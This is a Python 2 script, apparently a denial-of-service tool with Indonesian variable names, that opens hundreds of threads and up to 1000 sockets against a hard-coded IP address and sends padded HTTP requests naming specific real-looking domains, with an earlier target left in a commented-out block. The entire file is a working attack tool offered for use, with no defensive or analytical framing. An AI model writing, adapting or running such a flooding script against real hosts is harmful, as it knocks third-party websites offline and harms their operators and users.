import Queue
import socket
import thread
import threading
import time

# def Pengaturan():
#     return {
#         'host' : '123.30.174.190',           
#         'port' : 80,                    
#         'maxattack' : 500,            
#         'maxqueue' : 500,        
#         'maxthread' : 30,             
#         'keckoneksi' : 0.01,          
#         'waktuantarthread' : 0,       
#         'waktuantarkoneksi' : 0,   
#         'terimapaket' : True,                
#         'request' : ['GET / HTTP/1.1\r\nHost: volambisu.com\r\nKeep-Alive: 300\r\nConnection: Keep-Alive\r\nReferer: http://www.example.com/\r\n','User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.1.249.1045 Safari/532.5\r\n','Cookie: data1=' + ('A' * 100) + '&data2=' + ('A' * 100) + '&data3=' + ('A' * 100) + '\r\n'],                 
#     }
def Pengaturan():
    return {
        'host' : '54.251.128.124',           
        'port' : 80,                    
        'maxattack' : 1000,            
        'maxqueue' : 1000,        
        'maxthread' : 500,             
        'keckoneksi' : 0.1,          
        'waktuantarthread' : 0.1,       
        'waktuantarkoneksi' : 0.1,   
        'terimapaket' : True,                
        'request' : ['GET http://quandiem.net HTTP/1.1\r\nHost: quandiem.net\r\nKeep-Alive: 300\r\nConnection: Keep-Alive\r\nReferer: http://www.example.com/\r\n','User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.1.249.1045 Safari/532.5\r\n','Cookie: data1=' + ('A' * 100) + '&data2=' + ('A' * 100) + '&data3=' + ('A' * 100) + '\r\n'],                 
    }
class dosAttack(threading.Thread):
    options = {}

    running = False
    attacks = 0
    threads = 0
    sockets = 0

    def __init__(self):
        threading.Thread.__init__(self)
        self.queue = Queue.Queue()
        self.pengaturan = Pengaturan()
   

   

    def run(self):
        print 'Script Start'
        self.running = True

        thread.start_new_thread(self.buat_sockets, ())

        for id in range(self.pengaturan['maxthread']):
            thread.start_new_thread(self.attack, (id,))
            self.threads += 1
            if self.pengaturan['waktuantarthread'] > 0:
                time.sleep(self.pengaturan['waktuantarthread'])

    def buat_sockets(self):

        print 'Socket start.'
        count = 0
        while (self.pengaturan['maxattack'] > self.attacks) and self.running:
            if self.pengaturan['maxqueue'] > self.sockets:
                
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((self.pengaturan['host'], self.pengaturan['port']))
                    
                    self.queue.put((s, 0))
                    print 'Open socket, connect to host'
                    self.attacks += 1
                    self.sockets += 1
                except Exception, ex:
                    print 'Can not to connect. %s.' % (ex)
                print "Socket total connected : ",self.queue.qsize()   
            if self.pengaturan['waktuantarkoneksi'] > 0:
                time.sleep(self.pengaturan['waktuantarkoneksi'])

        print 'All socket connected completety.'

    def attack(self, id):
        print 'Attack thread %i begin' % (id)
        while self.running:
            
            (s, index) = self.queue.get()

            try:
                if len(self.pengaturan['request']) > index:
                    s.send(self.pengaturan['request'][index])

                    index += 1
                    self.queue.put((s, index))
                elif self.pengaturan['terimapaket'] == True:
                    data = s.recv(1024)
                    print data
                    if not len(data):
                        s.close()
                        print 'Socket ditutup, data tranfer selesai.'
                        self.sockets -= 1
                    else:
                        self.koneksi.put((s, index))
                else:
                    s.close()
                    print 'Socket ditutup.'
                    self.sockets -= 1
            except Exception, ex:
                print ex
                print 'Socket fail.'
                s.close()
                self.sockets -= 1

            if self.sockets == 0 and self.attacks == self.pengaturan['maxattack']:
                print 'Max Attack. Script Mati !'
                self.running = False
            elif self.sockets > 0 and self.pengaturan['keckoneksi'] > 0:
                
                time.sleep(1 / self.pengaturan['keckoneksi'] / self.sockets * self.threads)
            elif self.pengaturan['keckoneksi'] > 0:
                
                time.sleep(1 / self.pengaturan['keckoneksi'] * self.threads)
        print 'Attack thread %i selesai.' % (id)
        self.threads -= 1



class JalanDos(dosAttack):
    def __init__(self):
        self.options = Pengaturan()
        dosAttack.__init__(self)

    def mainloop(self):
        self.start()
        time.sleep(1)
        while self.running:
            pass
        print 'Finishing' 

s = JalanDos()
s.mainloop()
